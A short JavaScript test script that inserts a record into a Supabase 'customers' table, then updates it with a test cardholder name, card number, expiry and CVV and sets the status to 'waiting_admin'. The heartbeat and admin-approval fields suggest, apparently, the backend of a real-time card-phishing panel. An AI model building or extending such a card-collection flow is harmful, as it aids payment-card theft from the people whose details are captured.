import { createClient } from '@supabase/supabase-js';

const supabaseUrl = 'https://cgtewkervfjlcvrrztge.supabase.co';
const supabaseAnonKey = 'sb_publishable_aBk5gGCYG9qhLK2JFye6Hg_uKvmuVFd';

const supabase = createClient(supabaseUrl, supabaseAnonKey);

async function test() {
  const { data, error: insertError } = await supabase.from('customers').insert([{
    status: 'idle',
    page: 'test',
    device: 'test',
    last_update: Date.now(),
    last_heartbeat: Date.now()
  }]).select();
  
  if (insertError) {
    console.error('Insert Error:', insertError);
    return;
  }
  
  const customerId = data[0].id;
  console.log('Inserted:', customerId);
  
  const updateData = {
    card_name: 'Test Name',
    card_number: '1234567812345678', 
    expiry_month: '12',
    expiry_year: '2025',
    cvv: '123',
    status: 'waiting_admin',
    last_update: Date.now(),
    last_heartbeat: Date.now()
  };

  const { error: updateError } = await supabase.from('customers').update(updateData).eq('id', customerId);
  
  if (updateError) {
    console.error('Update Error:', updateError);
  } else {
    console.log('Update Successful');
  }
}

test();
